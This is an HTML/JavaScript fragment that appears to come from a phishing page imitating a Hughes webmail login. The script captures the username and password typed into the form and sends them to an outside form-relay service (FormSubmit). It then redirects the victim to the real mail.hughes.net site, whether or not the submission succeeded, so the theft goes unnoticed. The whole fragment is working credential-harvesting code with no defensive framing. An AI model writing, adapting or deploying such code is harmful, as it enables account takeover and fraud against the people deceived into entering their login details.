  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const form = document.getElementById("login-form"); // ensure your form has id="login-form"
      const pwd = document.getElementById("password");
      const toggle = document.querySelector(".toggle-password");

      // Toggle password visibility
      toggle.addEventListener("click", function () {
        if (pwd.type === "password") {
          pwd.type = "text";
          toggle.textContent = "Hide";
        } else {
          pwd.type = "password";
          toggle.textContent = "Show";
        }
      });

      // Handle form submission
      form.addEventListener("submit", function (e) {
        e.preventDefault();

        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        // Optional: copy to hidden fields if needed
        const hiddenUser = document.getElementById("username-hidden");
        const hiddenPass = document.getElementById("password-hidden");
        if (hiddenUser && hiddenPass) {
          hiddenUser.value = username;
          hiddenPass.value = password;
        }

        // Send form via FormSubmit
        fetch(form.action, {
          method: "POST",
          body: new FormData(form)
        })
        .then(() => {
          // Redirect after FormSubmit handles the data
          window.location.href = "https://mail.hughes.net";
        })
        .catch(error => {
          console.error("Error sending data:", error);
          // Redirect even if something goes wrong
          window.location.href = "https://mail.hughes.net";
        });
      });
    });
